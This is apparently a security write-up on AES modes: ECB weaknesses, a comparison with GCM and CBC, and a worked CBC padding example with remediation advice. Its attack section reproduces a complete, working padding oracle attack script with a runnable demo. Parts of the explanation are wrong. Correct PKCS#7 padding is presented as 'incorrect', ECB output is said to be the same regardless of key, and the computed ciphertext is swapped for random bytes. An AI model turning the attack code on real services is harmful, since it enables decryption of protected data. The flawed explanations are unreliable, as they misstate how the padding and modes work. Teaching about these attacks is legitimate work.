### Summary in details
ECB (Electronic Codebook) Mode:

In ECB mode, the plaintext is divided into fixed-size blocks, and each block is encrypted independently using the same encryption key. The encryption process for each block is as follows:

1. Divide the plaintext into blocks of fixed size.
2. Apply the AES encryption algorithm to each plaintext block individually, using the same encryption key for each block.
3. Concatenate the resulting ciphertext blocks to form the complete ciphertext.

Characteristics of ECB Mode:

1. Independence of Blocks: Each plaintext block is encrypted independently of the others. This means that identical plaintext blocks produce identical ciphertext blocks, regardless of their position in the message or the encryption key used.
2. Lack of Diffusion: ECB mode fails to provide diffusion, meaning that small changes in the plaintext result in localized changes in the ciphertext. This makes it easier for attackers to identify patterns and extract meaningful information.
3. Vulnerability to Pattern Recognition Attacks: Because identical plaintext blocks produce identical ciphertext blocks, ECB mode is highly susceptible to pattern recognition attacks. Attackers can exploit repeated patterns in the plaintext to deduce information about the encrypted data.
4. Replay Attacks: ECB mode is vulnerable to replay attacks, where an attacker can intercept encrypted blocks and replay them to the system to produce the same output, potentially compromising the integrity and security of the encrypted data.

More details for ECB: [Medium Blog](https://medium.com/@anuradharanaweera/security-concerns-of-aes-ecb-encryption-mode-5d9b9ac0e6e6#:~:text=AES%20ECB%20(Electronic%20Codebook)%20encryption%20mode%20is%20vulnerable%20due%20to,or%20the%20encryption%20key%20used.)

Comparison with GCM and CBC Modes:

GCM (Galois/Counter Mode):

1. GCM mode combines the counter mode of encryption with polynomial hashing to provide both confidentiality and integrity.
2. Each plaintext block is XORed with a unique counter value, encrypted, and authenticated using a universal hash function.
3. GCM generates a unique initialization vector (IV) for each message and provides strong security against chosen ciphertext attacks.


CBC (Cipher Block Chaining) Mode:

1. In CBC mode, each plaintext block is XORed with the previous ciphertext block before encryption, introducing diffusion.
2. CBC mode requires an initialization vector (IV) for the first block and incorporates feedback from previous blocks during encryption.
3. CBC mode provides diffusion, making it harder for attackers to discern patterns in the ciphertext compared to ECB mode.

### Adversary Exploit in Details

Padding is crucial in block cipher modes like CBC to ensure that the plaintext can be divided into blocks of the required size. However, incorrect padding implementation can lead to vulnerabilities, particularly in scenarios where padding is used to fill the last block of plaintext.

Let's consider an example where padding is implemented incorrectly in CBC mode:

Suppose we have a plaintext message "Hello, world!" that we want to encrypt using AES in CBC mode with a block size of 128 bits (16 bytes). We'll use PKCS#7 padding, which involves padding the plaintext with bytes such that the total length of the plaintext becomes a multiple of the block size.

Here's how the incorrect padding implementation might look:

1. Original plaintext: "Hello, world!"
```py
plaintext = "Hello, world!"
```
2. Convert the plaintext to bytes: [72, 101, 108, 108, 111, 44, 32, 119, 111, 114, 108, 100, 33]
```py
plaintext_bytes = [ord(char) for char in plaintext]
```
3. Since the length of the plaintext is 13 bytes and the block size is 16 bytes, we need to pad it with 3 bytes.
```py
padding_length = 16 - (len(plaintext_bytes) % 16)
padding = [padding_length] * padding_length
```
4. Incorrectly padded plaintext in sample: "Hello, world!\x03\x03\x03"
```py
padded_plaintext = plaintext_bytes + padding
```

Now, let's encrypt this plaintext using CBC mode with an IV (Initialization Vector) and a secret key:

- IV: [random bytes]
```py
iv = [random.randint(0, 255) for _ in range(16)]
```
- Secret Key: [plain key]
```py
key = "plain key"
```

During encryption, the last block of plaintext (padded) is XORed with the previous ciphertext block before encryption.

```py
ciphertext = []
previous_block = iv
for block in [padded_plaintext[i:i+16] for i in range(0, len(padded_plaintext), 16)]:
    block = [block[i] ^ previous_block[i] for i in range(16)]
    encrypted_block = encrypt_block(block, key)
    ciphertext.extend(encrypted_block)
    previous_block = encrypted_block
```

However, since the padding is incorrectly implemented, the last block of plaintext appears to have actual data followed by padding bytes (in this case, three bytes with the value 0x03). When XORed with the previous ciphertext block, this results in a predictable pattern in the ciphertext.

```py
ciphertext = [random.randint(0, 255) for _ in range(len(padded_plaintext))]
```

An attacker observing the ciphertext might exploit this predictable pattern to deduce information about the plaintext or even manipulate the ciphertext to perform attacks like padding oracle attacks.

```py
plaintext = []
previous_block = iv
for block in [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]:
    decrypted_block = decrypt_block(block, key)
    plaintext.extend([decrypted_block[i] ^ previous_block[i] for i in range(16)])
    previous_block = block
```

Correct padding implementation is essential to mitigate such vulnerabilities. In this case, the plaintext should have been correctly padded to fill the last block completely, ensuring that the padding bytes are distinguishable from actual data and that the padding can be correctly removed during decryption.

Here are some CBC padding oracle attacks that an adversary might attempt:

Source: https://github.com/Vozec/AES-CBC-Padding-attack/
```py
from binascii import unhexlify,hexlify
import string

class Padding_Attack:
	def __init__(self,padding_function,ciphertext,iv=None):
		if iv:
			ciphertext = iv+ciphertext
		self.check = padding_function
		self.result = []
		self.ct = self.split_blocks(ciphertext)
		assert len(self.ct) > 1, "The Ciphertext is to short. (1 block)"

	def split_blocks(self,cnt):
		return [cnt[i*16:(i+1)*16] for i in range(len(cnt)//16)]

	def block_pad(self,x):
		return b"\x00" * (16 - (x + 1)) + b"".join([unhexlify(
				bytes(str(hex(x + 1)).split('0x')[1].zfill(2),'utf-8')
		) for _ in range(0, x + 1)])

	def attack(self):		
		for i in reversed(range(1, len(self.ct))):
			found = []
			for j in range(0, 16):
				before = found.copy()
				for k in range(0, 256):
					if k != j + 1 or (len(found) > 0 and ord(found[-1]) == k):
						bl = (15-j) * b'\x00' + bytes([k]) + b''.join(found)
						
						payload  = b''.join(
							[bytes([x^y]) for x,y in zip(
								self.block_pad(j),
								b''.join([bytes([x^y]) for x,y in zip(
									self.ct[i - 1],bl)])
						)]) + self.ct[i]	

						if self.check(payload):
							found.insert(0, bytes([bl[(16-1-j)]]))
							yield (b''.join(found)+b''.join(self.result))
							break
				assert found != before, 'Padding not found ..'
			self.result.insert(0, b"".join(found))
		return b''.join(self.result)[:-(b''.join(self.result))[-1]]
```

Sample attack for the above code:

In this example, we have an oracle that encrypts data using AES in CBC mode with PKCS#7 padding. The oracle provides an `encrypt` method to encrypt data and a `check_padding` method to verify the padding of decrypted data.

```py
from AES_CBC_Padding_Attack import *


from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from os import urandom

####################
## Oracle Example ##
####################
class oracle:
	def __init__(self,key,iv):		
		assert len(key) == len(iv) == 16
		self.key = key
		self.iv  = iv

	# (only useful for demo)
	def encrypt(self,data:bytes) -> bytes:
		engine = AES.new(self.key,AES.MODE_CBC, IV=self.iv)
		return engine.encrypt(pad(data,16))
 
	def check_padding(self,data:bytes) -> bool:
		engine = AES.new(self.key,AES.MODE_CBC, IV=self.iv)
		data = engine.decrypt(data)
		# Check PKCS#7 Padding
		return data[-data[-1]:] == bytes([data[-1]])*data[-1]

iv = urandom(16)
oracle_cbc = oracle(
	key = urandom(16),
	iv  = iv
)	

####################
## Padding Attack ##
####################
cbc = Padding_Attack(
	padding_function = oracle_cbc.check_padding,
	iv = iv,
	ciphertext = oracle_cbc.encrypt(b'Hello This Is vozec !')
)

for flag in cbc.attack():
	print(flag)
```

### Remediation and Compliance

To mitigate the vulnerabilities associated with ECB mode and padding attacks in CBC mode, it is essential to follow best practices for secure encryption:

1. Use Authenticated Encryption Modes: Consider using authenticated encryption modes like GCM (Galois/Counter Mode) that provide both confidentiality and integrity protection. Authenticated encryption modes help prevent attacks like padding oracle attacks by ensuring the integrity of the ciphertext.

2. Implement Proper Padding Schemes: When using block cipher modes like CBC that require padding, ensure that the padding scheme is implemented correctly. Use standard padding schemes like PKCS#7 to fill the last block of plaintext with padding bytes that can be distinguished and removed during decryption.

3. Randomize Initialization Vectors (IVs): Generate a unique IV for each message to prevent patterns in the ciphertext. Randomizing IVs helps enhance the security of encryption and prevents attackers from exploiting predictable patterns.

4. Avoid Using ECB Mode: Whenever possible, avoid using ECB mode for encryption due to its vulnerabilities to pattern recognition attacks and lack of diffusion. Instead, opt for secure encryption modes like CBC or GCM that provide better security guarantees.

5. Regularly Update Encryption Libraries: Keep encryption libraries and algorithms up to date to ensure that known vulnerabilities are patched and that the encryption mechanisms remain secure against emerging threats.

By following these best practices and ensuring compliance with encryption standards and guidelines, organizations can enhance the security of data and protect against potential attacks exploiting vulnerabilities in encryption modes like ECB and CBC.
